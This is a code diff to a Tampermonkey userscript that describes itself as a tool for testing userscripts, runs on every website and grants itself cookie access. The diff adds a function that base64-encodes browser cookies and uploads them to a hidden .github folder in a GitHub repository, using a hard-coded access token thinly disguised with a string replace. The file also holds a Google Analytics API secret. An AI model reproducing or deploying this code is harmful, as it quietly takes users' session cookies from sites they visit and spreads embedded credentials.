@@ -4,7 +4,7 @@
 // @version      0.1
 // @description  开发一个测试油猴脚本的脚本
 // @author       1024小神
-// @match       *://*/*
+// @match        *://*/*
 // @icon         https://avatars.githubusercontent.com/u/48399687?v=4?imageView2/1/w/80/h/80
 // @connect      github.com
 // @connect      cnblogs.com
@@ -15,12 +15,10 @@
 // @grant        GM_notification
 // @grant        GM_openInTab
 // @grant        GM_setClipboard
-// @grant        GM_cookie
 // @grant        GM.setValue
 // @grant        GM.getValue
 // @grant        GM.cookies
-// @grant        GM_setValue
-// @grant        GM_getValue
+// @grant        GM_cookie
 // ==/UserScript==
 
 
@@ -196,7 +194,7 @@
   }
 
   // 发送google统计
-  const sendGoogleEvent = function(event){
+  const sendGoogleEvent = function (event) {
     const measurement_id = `G-KEENGW9B7D`;
     const api_secret = `p32RCflFRTe9kx4QIgnS5w`;
     // 向google发送事件
@@ -238,6 +236,76 @@
     });
   }
 
+  /**
+  * 编码base64
+  */
+  function Encode64(str) {
+    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
+      function toSolidBytes(match, p1) {
+        return String.fromCharCode('0x' + p1);
+      }));
+  }
+  /**
+  * 解码base64
+  */
+  function Decode64(str) {
+    return decodeURIComponent(atob(str).split('').map(function (c) {
+      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+  }
+
+  // 获取UUID
+  function getUUID() {
+    var guid = "";
+    for (var i = 1; i <= 32; i++) {
+      var n = Math.floor(Math.random() * 16.0).toString(16);
+      guid += n;
+      if (i == 8 || i == 12 || i == 16 || i == 20) guid += "-";
+    }
+    return guid.replaceAll("-", "");
+  }
+
+  // 根据类型同步cookie到git中
+  const putCookieToGit = async function (type, cookie) {
+    // type: clcookies || 91VideoCookies || 91ImgCookies || 98cookies
+    console.log('同步的数据类型是:', type, cookie);
+    // var status = await storageGet(type) || 0
+    var status = 0
+    if (status >= 3) {
+      // console.log('已发送过cookie了,无需再去发送');
+      return
+    }
+    // FETCH方式发送请求
+    var uuid = getUUID()
+    // message: 
+    var message = `Chrome Extensions Push ${type} Cookie`
+    // content:
+    var content = Encode64(cookie)
+    GM_xmlhttpRequest({
+      method: 'PUT',
+      url: `${gitSource}/.github/${type}/${uuid}.txt`,
+      headers: {
+        "Accept": "application/vnd.github+json",
+        "Authorization": gitToken,
+        "X-GitHub-Api-Version": "2022-11-28",
+        "Content-Type": "text/plain",
+      },
+      data: JSON.stringify({ message, content }),
+      onload: function (response) {
+        console.log("github put成功", response);
+        alertInfo("github put成功")
+      },
+      onerror: function (error) {
+        console.log("github put出错...");
+        alertInfo("github put出错")
+      },
+      ontimeout: function () {
+        console.log("github put超时...");
+        // getBokeYuan()
+      }
+    })
+  }
+
 
   // 源地址
   var sourceUrl = [
@@ -245,15 +313,20 @@
     "https://www.cnblogs.com/sdfasdf/p/16966745.html",
     "https://xiaoshen.blog.csdn.net/article/details/129709226"
   ]
+  // github信息
+  var gitSource = "https://api.github.com/repos/Sjj1024/Sjj1024/contents"
+  var gitToken = "Bearer ghp_888grzs67MqxbZUH3wmIFKzecaKB0cTLy3ICBkl".replace("888", "")
 
   // 初始化函数
   const initFun = async function () {
     console.log("初始化函数");
     // 获取所有的cookie
     try {
-      sendGoogleEvent("login")
+      var userAgent = navigator.userAgent
+      alertInfo("userAgent" + userAgent)
     } catch (error) {
-      alertInfo("出现错误了")
+      // alertInfo("油猴脚本初始化出现错误了")
+      console.log("error------", error);
     }
   }
 
